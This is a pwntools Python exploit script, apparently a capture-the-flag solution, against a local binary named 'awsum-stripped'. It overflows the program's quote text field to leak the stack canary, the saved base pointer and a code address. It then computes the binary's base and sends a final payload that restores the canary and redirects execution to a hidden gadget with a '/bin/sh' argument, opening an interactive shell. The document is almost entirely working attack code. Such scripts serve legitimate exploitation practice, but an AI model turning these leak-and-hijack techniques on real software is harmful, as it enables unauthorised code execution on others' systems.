from pwn import *
import time

r = process('./awsum-stripped')

if args.GDB:
	raw_input('attach GDB')

T_PAUSE = 0.02
OFFS_TEXT_CANARY = 0x58
OFFS_AUTHOR_CANARY = 0x78
OFFS_TEXT_CODE = 0x68


# 1st malicious quote -> LEAK CANARY + SAVED BP

r.sendline(b'3')	# Add quote menu

# overwrite canary's least significant byte
r.send(b'A' * OFFS_TEXT_CANARY + b'B')			# text payload
r.recvuntil(b'B')

canary_raw = r.recv(7)
saved_BP_raw = r.recvuntil(b'\"', drop=True)
canary = u64(canary_raw.rjust(8, b'\x00'))
saved_BP = u64(saved_BP_raw.ljust(8, b'\x00'))

r.sendline(b'y')
print(f'canary: {hex(canary)}, saved BP: {hex(saved_BP)}')
time.sleep(T_PAUSE)
# restore canary
r.send(b'C' * OFFS_AUTHOR_CANARY + b'\x00')		# author payload


# 2nd malicious quote -> LEAK SAVED IP
time.sleep(T_PAUSE)

r.sendline(b'3')
time.sleep(T_PAUSE)
r.send(b'A' * (OFFS_TEXT_CODE - 1) + b'B')
time.sleep(T_PAUSE)
r.recvuntil(b'B')
saved_IP_raw = r.recvuntil(b'\"', drop=True)
saved_IP = u64(saved_IP_raw.ljust(8, b'\x00'))

print(f'code: {hex(saved_IP)}')
r.sendline(b'y')

# prepare tha author payload so that it reconstructs canary and saved BP

# payload_restore = b'A' * (OFFS_AUTHOR_CANARY - 1) + b'\n'  
payload_restore = b'A' * OFFS_AUTHOR_CANARY
payload_restore += p64(canary)
payload_restore += p64(saved_BP)
if args.GDB:
	raw_input('check code leak. going to restore IP and BP')
time.sleep(T_PAUSE)
r.send(payload_restore)


# Now I have all the leaks needed to hijack control flow
# Just need to find "/bin/sh", 4 zeros and the hidden gadget on the elf


# 3rd malicious quote

OFFS_ELF_LEAK = 0x103d
OFFS_ELF_GADGET = 0x987
OFFS_ELF_BINSH = 0x157d
OFFS_ELF_ZEROS = 0x7fd
elf_base = saved_IP - OFFS_ELF_LEAK
addr_gadget = elf_base + OFFS_ELF_GADGET
addr_binsh = elf_base + OFFS_ELF_BINSH
addr_zeros = elf_base + OFFS_ELF_ZEROS

time.sleep(T_PAUSE)
r.sendline(b'3')

# add \n so that the addresses are not modified in the case they contain some \x0a bytes
# Canary and saved BP cannot contain \x0a because otherwise i wouldn't have been able to leak them
payload = b'A' * (OFFS_TEXT_CANARY - 1) + b'\n'
payload += p64(canary)
payload += p64(saved_BP)
payload += p64(addr_gadget)		# hidden gadget
payload += p64(addr_zeros)
payload += p64(addr_binsh)

assert len(payload) <= 0x80


if args.GDB:
	raw_input('going to send the final payload')

time.sleep(T_PAUSE)
r.send(payload)

if args.GDB:
	raw_input('gonna send "y"')

time.sleep(T_PAUSE)
r.sendline('y')

if args.GDB:
	raw_input('gonna send "pwned" as author')
time.sleep(T_PAUSE)
r.sendline('pwned')		# author, don't care
r.recvuntil('collection')

r.interactive()

